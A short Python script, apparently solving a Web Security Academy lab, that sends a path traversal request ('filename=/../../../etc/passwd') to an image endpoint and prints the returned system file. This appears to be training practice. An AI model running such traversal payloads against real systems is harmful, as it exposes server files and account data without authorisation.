import requests
s = requests.Session()

site = 'ac141fa51f986ca0c0a610a40061006e.web-security-academy.net'

url = f'''https://{site}/image?filename=/../../../etc/passwd'''
resp = s.get(url)
print(resp.text)